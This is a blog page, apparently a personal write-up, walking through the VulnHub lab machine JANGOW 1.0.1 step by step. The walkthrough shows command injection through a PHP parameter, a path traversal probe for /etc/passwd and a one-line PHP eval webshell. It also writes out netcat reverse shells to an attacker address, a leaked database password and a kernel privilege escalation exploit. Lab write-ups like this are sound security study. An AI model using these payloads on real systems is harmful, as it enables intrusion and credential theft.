@@ -1,0 +1,791 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/chtholly1.jpg">
+  <link rel="icon" href="/img/chtholly1.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#4c81b9">
+  <meta name="author" content="Isolator">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="day1">
+<meta property="og:type" content="article">
+<meta property="og:title" content="vulnhub 做题 JANGOW 1.0.1">
+<meta property="og:url" content="https://isolator-1.github.io/2024/10/12/penetration/1/index.html">
+<meta property="og:site_name" content="Isolator&#39;s Blog">
+<meta property="og:description" content="day1">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://isolator-1.github.io/img/pene/1.png">
+<meta property="og:image" content="https://isolator-1.github.io/img/pene/2.png">
+<meta property="article:published_time" content="2024-10-11T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-10-12T10:35:35.267Z">
+<meta property="article:author" content="Isolator">
+<meta property="article:tag" content="penetration">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://isolator-1.github.io/img/pene/1.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>vulnhub 做题 JANGOW 1.0.1 - Isolator&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"isolator-1.github.io","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":1},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>_φ_(．．) Chtholly Nota Seniorious</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                Links
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/chtholly2.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="vulnhub 做题 JANGOW 1.0.1"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-10-12 00:00" pubdate>
+          October 12, 2024 am
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.6k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          30 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">vulnhub 做题 JANGOW 1.0.1</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <hr>
+<p>title: 2023.11 月赛<br>tags: [ctf-misc]<br>date: 2023-11-25 15:06:00<br>categories: [ctf-misc]<br>excerpt: 月赛writeup</p>
+<hr>
+<h2 id="vulnhub-做题-JANGOW-1-0-1"><a href="#vulnhub-做题-JANGOW-1-0-1" class="headerlink" title="vulnhub 做题 JANGOW: 1.0.1"></a>vulnhub 做题 JANGOW: 1.0.1</h2><h3 id="用vmware开机分配不到ip"><a href="#用vmware开机分配不到ip" class="headerlink" title="用vmware开机分配不到ip"></a>用vmware开机分配不到ip</h3><p>开机时按e进入gnu grub的boot选项配置界面，把linux一行最后的 ro 改成 <code>rw single init=/bin/bash</code>, ctrl+x 保存重启。</p>
+<p>ip addr 可以查看有哪些网卡，然后打开 /etc/network/interfaces 把 primary network interface 里边的网卡替换成已有的。（也不知道这个interfaces里写的网卡是哪里来的，可能是因为我用的vmware不是virtualbox？）</p>
+<p>（还遇到了键盘按/结果出来的是;的问题，也不知道是咋回事😴）</p>
+<p><code>/etc/init.d/networking restart</code>, 然后重启虚拟机</p>
+<p>虽然本来该显示ip的REDE:还是什么都没有， 但是 nmap 已经可以扫到这个主机了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs zsh">└─$ nmap -sn 192.168.169.0/24<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-11 03:50 EDT<br>Nmap scan report for 192.168.169.2<br>Host is up (0.00053s latency).<br>Nmap scan report for 192.168.169.128<br>Host is up (0.00035s latency).<br>Nmap scan report for 192.168.169.129<br>Host is up (0.0022s latency).<br>Nmap done: 256 IP addresses (3 hosts up) scanned in 3.03 seconds<br></code></pre></td></tr></table></figure>
+
+<h3 id="扫描"><a href="#扫描" class="headerlink" title="扫描"></a>扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs zsh">PORT   STATE SERVICE VERSION<br>21/tcp open  ftp     vsftpd 3.0.3<br>80/tcp open  http    Apache httpd 2.4.18<br>|_http-server-header: Apache/2.4.18 (Ubuntu)<br>| http-ls: Volume /<br>| SIZE  TIME              FILENAME<br>| -     2021-06-10 18:05  site/<br>|_<br>|_http-title: Index of /<br></code></pre></td></tr></table></figure>
+
+<p>看到了web和ftp端口</p>
+<h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>打开这个web，会告诉/site路径下有一个网站</p>
+<p><img src="/img/pene/1.png" srcset="/img/loading.gif" lazyload></p>
+<p>一顿乱点发现右上角这个Buscar会跳转到一个奇怪的路径，<code>http://192.168.169.129/site/busque.php?buscar=</code>，这种路径用kali的dirbuster还找不到。看到有的题解说用feroxbuster <del>（但是这东西要两个G）</del>，而且我实际用了一下也没扫到这个busque.php😢，倒是扫到了wordpress路径，但是和这道题没关系😴</p>
+<p>然后对这个php的参数传进去一个linux命令，比如ls、id、ps等等，发现能执行并回显 <del>（我也不知道为什么就想到了输个linux命令进去，可能这就是大佬的经验吧）</del></p>
+<p>其实这种情况也可以试试文件包含漏洞，形如 <code>busque.php?buscar=../../../../../../etc/passwd</code></p>
+<p>知道了可以执行命令尝试用nc反弹shell，<code>which%20nc</code> 发现确实有nc</p>
+<p><code>nc -lvvp 6666</code>监听链接，<code>nc%20-e%20/bin/bash%20&lt;attacker-ip&gt;%206666</code>尝试反弹shell</p>
+<p>但是监听不到任何链接😭，只能换个方法</p>
+<p>寻找ssh私钥  <code>cat%20/home/jangow01/.ssh/id_rsa</code> , 也没有回显</p>
+<p>只能到处找找有没有什么奇怪的文件了</p>
+<p>通过cat可以看到busque.php内容是<code>?php system($_GET[&#39;buscar&#39;]); ?</code>，现在也没用了</p>
+<p>通过<code>ls -alh</code>在<code>/var/www/html</code>下发现有一个.backups文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$servername</span> = <span class="hljs-string">&quot;localhost&quot;</span>; <br><span class="hljs-variable">$database</span> = <span class="hljs-string">&quot;jangow01&quot;</span>; <br><span class="hljs-variable">$username</span> = <span class="hljs-string">&quot;jangow01&quot;</span>; <br><span class="hljs-variable">$password</span> = <span class="hljs-string">&quot;abygurl69&quot;</span>; <span class="hljs-comment">// Create connection </span><br><span class="hljs-variable">$conn</span> = <span class="hljs-title function_ invoke__">mysqli_connect</span>(<span class="hljs-variable">$servername</span>, <span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>, <span class="hljs-variable">$database</span>); <span class="hljs-comment">// Check connection </span><br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$conn</span>) &#123; <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Connection failed: &quot;</span> . <span class="hljs-title function_ invoke__">mysqli_connect_error</span>()); &#125; <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Connected successfully&quot;</span>;<br><span class="hljs-title function_ invoke__">mysqli_close</span>(<span class="hljs-variable">$conn</span>); <br></code></pre></td></tr></table></figure>
+
+<p>由于端口扫描没开ssh服务，并且开了ftp服务，看一下是不是这个登陆密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs zsh">└─$ ftp 192.168.169.129                          <br>Connected to 192.168.169.129.<br>220 (vsFTPd 3.0.3)<br>Name (192.168.169.129:kali): jangow01<br>331 Please specify the password.<br>Password: <br>230 Login successful.<br>Remote system type is UNIX.<br>Using binary mode to transfer files.<br>ftp&gt; ls<br>229 Entering Extended Passive Mode (|||14986|)<br>150 Here comes the directory listing.<br>drwxr-xr-x    3 0        0            4096 Oct 31  2021 html<br>226 Directory send OK.<br>ftp&gt; <br></code></pre></td></tr></table></figure>
+
+<p>成功登录 </p>
+<p>生成一个一句话木马 </p>
+<p><code>echo &#39;&lt;?php eval($_POST[&quot;cmd&quot;]); ?&gt;&#39; &gt; shell.php</code></p>
+<p><code>echo%20%27%3C?php%20eval($_POST[%22cmd%22]);%20?%3E%27%20%3E%20shell.php</code></p>
+<blockquote>
+<p>但是我在尝试用ftp上传一个shell.php文件时，会报错：553 Could not create file. 应该是权限不够，但是下载是可以的<br>那这道题给ftp的用户名和密码是为了啥呢，后面也用不到了😶‍🌫️</p>
+</blockquote>
+<p>用AntSword链接，地址是 <code>http://192.168.169.129/site/shell.php</code> (要带上site) 密码就是要post的参数名cmd</p>
+<p>创建一个用来反弹shell的php，rev.php</p>
+<p>然后写入<code>echo &#39;&lt;?php system(&quot;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.169.128 443 &gt;/tmp/f&quot;);?&gt;&#39; &gt; rev.php</code></p>
+<blockquote>
+<p>我不知道为什么echo进去总是失败，最后用的AntSword的文件管理写进去的</p>
+</blockquote>
+<p>这里选择443端口是因为其余端口有防火墙，而靶机大部分是不会禁80 443的</p>
+<p>浏览器访问rev.php，成功拿到反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs zsh">┌──(kali㉿kali)-[~]<br>└─$ sudo nc -nlvp 443            <br>[sudo] password for kali: <br>listening on [any] 443 ...<br>connect to [192.168.169.128] from (UNKNOWN) [192.168.169.129] 52324<br>/bin/sh: 0: can&#x27;t access tty; job control turned off<br>$ ls<br>assets<br>busque.php<br>css<br>index.html<br>js<br>rev.php<br>shell.php<br>wordpress<br>$ <br></code></pre></td></tr></table></figure>
+
+
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>通过which命令知道/usr/bin/python3，然后用 pty 方式来升级shell<br><code>/usr/bin/python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p>
+<p>得到了一个正常的shell</p>
+<p>然后uname -a查看系统版本，发现是4.4.0-31-generic ubuntu</p>
+<p>用kali的searchsploit搜索提权代码，然后用ftp或者AntSword上传到靶机上</p>
+<p><code>/usr/share/exploitdb/exploits/linux/local/45010.c</code></p>
+<p>编译执行提权成功</p>
+<p><img src="/img/pene/2.png" srcset="/img/loading.gif" lazyload></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/penetration/" class="category-chain-item">penetration</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/penetration/">#penetration</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>vulnhub 做题 JANGOW 1.0.1</div>
+      <div>https://isolator-1.github.io/2024/10/12/penetration/1/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>Isolator</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>October 12, 2024</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/10/13/penetration/2/" title="vulnhub 做题 Empire:Breakout">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">vulnhub 做题 Empire:Breakout</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/09/27/ai/binarized%20network/" title="Binarized Network">
+                        <span class="hidden-mobile">Binarized Network</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;Table of Contents</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        Views: 
+        <span id="busuanzi_value_site_pv"></span>
+        
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        Visitors: 
+        <span id="busuanzi_value_site_uv"></span>
+        
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  
+      <script>
+        if (!window.MathJax) {
+          window.MathJax = {
+            tex    : {
+              inlineMath: { '[+]': [['$', '$']] }
+            },
+            loader : {
+              load: ['ui/lazy']
+            },
+            options: {
+              renderActions: {
+                insertedScript: [200, () => {
+                  document.querySelectorAll('mjx-container').forEach(node => {
+                    let target = node.parentNode;
+                    if (target.nodeName.toLowerCase() === 'li') {
+                      target.parentNode.classList.add('has-jax');
+                    }
+                  });
+                }, '', false]
+              }
+            }
+          };
+        } else {
+          MathJax.startup.document.state(0);
+          MathJax.texReset();
+          MathJax.typeset();
+          MathJax.typesetPromise();
+        }
+
+        Fluid.events.registerRefreshCallback(function() {
+          if ('MathJax' in window && MathJax.startup.document && typeof MathJax.startup.document.state === 'function') {
+            MathJax.startup.document.state(0);
+            MathJax.texReset();
+            MathJax.typeset();
+            MathJax.typesetPromise();
+          }
+        });
+      </script>
+    
+
+  <script  src="https://lib.baomitu.com/mathjax/3.2.2/es5/tex-mml-chtml.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
